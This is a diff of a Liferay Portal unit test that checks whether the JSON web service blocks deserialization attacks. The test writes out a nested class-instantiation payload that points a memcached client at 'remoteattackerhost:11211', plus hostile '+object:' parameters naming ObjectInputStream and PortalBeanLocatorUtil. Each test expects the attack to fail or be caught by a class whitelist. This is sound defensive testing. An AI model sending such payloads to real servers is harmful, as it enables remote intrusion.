@@ -14,13 +14,25 @@
 
 package com.liferay.portal.jsonwebservice;
 
+import com.liferay.petra.string.StringBundler;
+import com.liferay.portal.jsonwebservice.action.JSONWebServiceInvokerAction;
 import com.liferay.portal.kernel.jsonwebservice.JSONWebServiceAction;
-import com.liferay.portal.kernel.util.StringBundler;
+import com.liferay.portal.kernel.module.util.SystemBundleUtil;
+import com.liferay.portal.kernel.util.MapUtil;
+import com.liferay.portal.kernel.util.PropsKeys;
+import com.liferay.portal.test.rule.LiferayUnitTestRule;
+
+import jodd.typeconverter.TypeConversionException;
 
 import junit.framework.TestCase;
 
 import org.junit.BeforeClass;
+import org.junit.ClassRule;
+import org.junit.Rule;
 import org.junit.Test;
+
+import org.osgi.framework.BundleContext;
+import org.osgi.framework.ServiceRegistration;
 
 import org.springframework.mock.web.MockHttpServletRequest;
 
@@ -28,6 +40,11 @@ import org.springframework.mock.web.MockHttpServletRequest;
  * @author Igor Spasic
  */
 public class JSONWebServiceSecureTest extends BaseJSONWebServiceTestCase {
+
+	@ClassRule
+	@Rule
+	public static final LiferayUnitTestRule liferayUnitTestRule =
+		LiferayUnitTestRule.INSTANCE;
 
 	@BeforeClass
 	public static void setUpClass() throws Exception {
@@ -49,7 +66,7 @@ public class JSONWebServiceSecureTest extends BaseJSONWebServiceTestCase {
 
 			TestCase.fail();
 		}
-		catch (Exception e) {
+		catch (Exception exception) {
 		}
 	}
 
@@ -58,31 +75,25 @@ public class JSONWebServiceSecureTest extends BaseJSONWebServiceTestCase {
 		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
 			"/open/run2");
 
-		StringBundler sb = new StringBundler(15);
-
-		sb.append("{\"class\":");
-		sb.append("\"com.liferay.portal.kernel.dao.orm.EntityCacheUtil\",");
-
-		sb.append("\"entityCache\":{\"class\":");
-		sb.append("\"com.liferay.portal.dao.orm.common.EntityCacheImpl\",");
-
-		sb.append("\"multiVMPool\":{\"class\":");
-		sb.append("\"com.liferay.portal.cache.MultiVMPoolImpl\",");
-
-		sb.append("\"portalCacheManager\":{\"class\":");
-		sb.append(
-			"\"com.liferay.portal.cache.memcached.MemcachePortalCacheManager");
-		sb.append("\",\"timeout\":60,\"timeoutTimeUnit\":\"SECONDS\",");
-
-		sb.append("\"memcachedClientPool\":{\"class\":");
-		sb.append("\"com.liferay.portal.cache.memcached.");
-		sb.append("DefaultMemcachedClientFactory\",");
-
-		sb.append("\"connectionFactory\":{\"class\":");
-		sb.append("\"net.spy.memcached.BinaryConnectionFactory\"},");
-		sb.append("\"addresses\":[\"remoteattackerhost:11211\"]}}}}}");
-
-		mockHttpServletRequest.setParameter("bytes", sb.toString());
+		mockHttpServletRequest.setParameter(
+			"bytes",
+			StringBundler.concat(
+				"{\"class\":",
+				"\"com.liferay.portal.kernel.dao.orm.EntityCacheUtil\",",
+				"\"entityCache\":{\"class\":",
+				"\"com.liferay.portal.dao.orm.common.EntityCacheImpl\",",
+				"\"multiVMPool\":{\"class\":",
+				"\"com.liferay.portal.cache.MultiVMPoolImpl\",",
+				"\"portalCacheManager\":{\"class\":",
+				"\"com.liferay.portal.cache.memcached.",
+				"MemcachePortalCacheManager\",\"timeout\":60,\"",
+				"timeoutTimeUnit\":\"SECONDS\",",
+				"\"memcachedClientPool\":{\"class\":",
+				"\"com.liferay.portal.cache.memcached.",
+				"DefaultMemcachedClientFactory\",",
+				"\"connectionFactory\":{\"class\":",
+				"\"net.spy.memcached.BinaryConnectionFactory\"},",
+				"\"addresses\":[\"remoteattackerhost:11211\"]}}}}}"));
 
 		JSONWebServiceAction jsonWebServiceAction = lookupJSONWebServiceAction(
 			mockHttpServletRequest);
@@ -92,8 +103,104 @@ public class JSONWebServiceSecureTest extends BaseJSONWebServiceTestCase {
 
 			TestCase.fail();
 		}
-		catch (Exception e) {
+		catch (Exception exception) {
 		}
+	}
+
+	@Test(expected = TypeConversionException.class)
+	public void testAttack3NotOnWhitelistCall() throws Exception {
+		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
+			"/invoke");
+
+		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
+		mockHttpServletRequest.setParameter(
+			"+object:java.io.ObjectInputStream", "{}");
+
+		JSONWebServiceAction jsonWebServiceAction =
+			new JSONWebServiceInvokerAction(mockHttpServletRequest);
+
+		jsonWebServiceAction.invoke();
+	}
+
+	@Test(expected = IllegalArgumentException.class)
+	public void testAttack3UtilCall() throws Exception {
+		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
+			"/invoke");
+
+		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
+		mockHttpServletRequest.setParameter(
+			"+object:com.liferay.portal.kernel.bean.PortalBeanLocatorUtil",
+			"{\"beanLocator\":null}");
+
+		JSONWebServiceAction jsonWebServiceAction =
+			new JSONWebServiceInvokerAction(mockHttpServletRequest);
+
+		jsonWebServiceAction.invoke();
+	}
+
+	@Test
+	public void testAttack3ValidCall() throws Exception {
+		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
+			"/invoke");
+
+		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
+		mockHttpServletRequest.setParameter("+object:java.lang.Object", "{}");
+
+		JSONWebServiceAction jsonWebServiceAction =
+			new JSONWebServiceInvokerAction(mockHttpServletRequest);
+
+		jsonWebServiceAction.invoke();
+	}
+
+	@Test
+	public void testAttack3WhitelistedByOSGiCall() throws Exception {
+		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
+			"/invoke");
+
+		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
+		mockHttpServletRequest.setParameter("+object:java.util.Random", "{}");
+
+		JSONWebServiceAction jsonWebServiceAction =
+			new JSONWebServiceInvokerAction(mockHttpServletRequest);
+
+		try {
+			jsonWebServiceAction.invoke();
+
+			TestCase.fail();
+		}
+		catch (Exception exception) {
+		}
+
+		BundleContext bundleContext = SystemBundleUtil.getBundleContext();
+
+		ServiceRegistration<Object> serviceRegistration =
+			bundleContext.registerService(
+				Object.class, new Object(),
+				MapUtil.singletonDictionary(
+					PropsKeys.
+						JSONWS_WEB_SERVICE_PARAMETER_TYPE_WHITELIST_CLASS_NAMES,
+					new String[] {"java.util.Random", "some.other.Class"}));
+
+		try {
+			jsonWebServiceAction.invoke();
+		}
+		finally {
+			serviceRegistration.unregister();
+		}
+	}
+
+	@Test
+	public void testAttack3WhitelistedByPropertiesCall() throws Exception {
+		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
+			"/invoke");
+
+		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
+		mockHttpServletRequest.setParameter("+object:java.util.Date", "0");
+
+		JSONWebServiceAction jsonWebServiceAction =
+			new JSONWebServiceInvokerAction(mockHttpServletRequest);
+
+		jsonWebServiceAction.invoke();
 	}
 
 }
